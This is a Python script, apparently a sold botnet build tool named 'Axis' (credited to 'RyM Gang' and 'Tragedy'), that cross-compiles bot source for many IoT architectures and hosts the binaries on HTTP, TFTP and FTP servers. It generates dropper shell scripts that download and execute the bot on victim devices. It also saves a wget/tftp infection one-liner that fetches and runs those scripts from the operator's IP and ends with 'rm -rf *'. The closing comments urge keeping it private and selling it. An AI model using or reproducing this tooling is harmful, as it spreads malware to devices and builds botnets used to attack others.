# Blade Cross-Compiler, Modified For Axis
# RyM Gang

import sys
import time
import subprocess

if len(sys.argv) < 3:
    print("\x1b[31mIncorrect Usage!\x1b[0m")
    sys.exit()

bot = "~/AXB/*.c"
ip = sys.argv[2]
prefix = sys.argv[3]

print "         \x1b[1;36m[\x1b[1;31mAxis\x1b[1;36m]"
arch_question = raw_input("\x1b[1;36mDownload Cross Compilers? y/n:\x1b[0m")
if arch_question.lower() == "y":
    get_arch = True
else:
    get_arch = False

time.sleep(5)
  
compileas = ["mips", #mips
             "mipsel", #mipsel
             "sh4", #sh4
             "x86", #x86
             "armv6l", #Armv6l
             "i686", #i686
             "powerpc", #ppc
             "i586", #i586
             "m68k", #m68k
             "sparc", #sparc
             "armv4l", #' '
             "armv5l"]

getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2']
ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-sh4",
       "cross-compiler-x86_64",
       "cross-compiler-armv6l",
       "cross-compiler-i686",
       "cross-compiler-powerpc",
       "cross-compiler-i586",
       "cross-compiler-m68k",
       "cross-compiler-sparc",
       "cross-compiler-armv4l",
       "cross-compiler-armv5l"]
       

def run(cmd):
    subprocess.call(cmd, shell=True)

run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

if get_arch == True:
    run("rm -rf cross-compiler-*")
    print("\x1b[1;36mDownloading Architectures...\x1b[0m")
  
    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.*")
        run("rm -rf *tar.*")

    print("\x1b[1;36mDownloaded Cross Compilers...\x1b[0m")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + "_BUILD -o " + compileas[num] + " " + bot + " > /dev/null")
    run("./"+cc+"/bin/"+arch+"-strip -s " + arch.upper() + " > /dev/null")
    #ok = "./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + "_BUILD -o " + compileas[num] + " " + bot + " > /dev/null"
    #run("echo '"+ok+"' >> lol.txt")
    num += 1

print("\x1b[1;36mSetting up HTTPD and TFTP...\x1b[0m")
time.sleep(5)

run("yum install httpd -y")
run("service httpd start")
run("yum install xinetd tftp tftp-server -y")
run("yum install vsftpd -y")
run("service vsftpd start")

run('''echo -e "# default: off
# description: The tftp server serves files using the trivial file transfer   \
#       protocol.  The tftp protocol is often used to boot diskless           \
#       workstations, download configuration files to network-aware printers,  \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')

print("\x1b[1;36mStarting XINETD...\x1b[0m")
run("service xinetd start")
time.sleep(5)

run('''echo -e "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')

print("\x1b[1;36mRestarting VSFTPD...\x1b[0m")
run("service vsftpd restart")
time.sleep(5)

for i in compileas:
    run("cp " + i + " /var/www/html")
    run("cp " + i + " /var/ftp")
    run("mv " + i + " /var/lib/tftpboot")

run('echo -e "#!/bin/bash" > /var/lib/tftpboot/'+prefix+'tftp1.sh')
run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/'+prefix+'tftp1.sh')
run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/'+prefix+'tftp1.sh')
run('echo -e "#!/bin/bash" > /var/lib/tftpboot/'+prefix+'tftp2.sh')
run('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/'+prefix+'tftp2.sh')
run('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/'+prefix+'tftp2.sh')
run('echo -e "#!/bin/bash" > /var/www/html/'+prefix+'bins.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/'+prefix+'bins.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/'+prefix+'tftp1.sh')
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/'+prefix+'tftp2.sh')

print("\x1b[1;36mRestarting XINETD...\x1b[0m")
run("service xinetd restart")
time.sleep(5)
print("\x1b[1;36mRestarting HTTPD...\x1b[0m")
run("service httpd restart")
time.sleep(5)
print("\x1b[1;36mUnlimiting Connections Allowed to Server...\x1b[0m")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
time.sleep(5)

print("\x1b[33mCross-Compiling Complete!\x1b[0m")

payload = "cd /tmp || cd /run || cd /; wget http://"+ip+"/"+prefix+"bins.sh; chmod 777 "+prefix+"bins.sh; sh "+prefix+"bins.sh; tftp "+ip+" -c get "+prefix+"tftp1.sh; chmod 777 "+prefix+"tftp1.sh; sh "+prefix+"tftp1.sh; tftp -r "+prefix+"tftp2.sh -g "+ip+"; chmod 777 "+prefix+"tftp2.sh; sh "+prefix+"tftp2.sh; rm -rf "+prefix+"bins.sh "+prefix+"tftp1.sh "+prefix+"tftp2.sh; rm -rf *"
f = open("/root/Loader/PAYLOAD.txt", "w")
f.write(payload)
f.close()
print("\x1b[33mPayload Saved To /root/Loader/PAYLOAD.txt\x1b[0m")
exit(1)

#    Modifying This Code Is Permitted, However, Ripping Code From This/Removing Credits Is The Lowest Of The Low.
#    Sales Release 10/5/2019
#    KEEP IT PRIVATE; I'd Rather You Sell It Than Give It Away Or Post Somewhere. We're All Here To Make Money!
#    Much Love 
#        - Tragedy
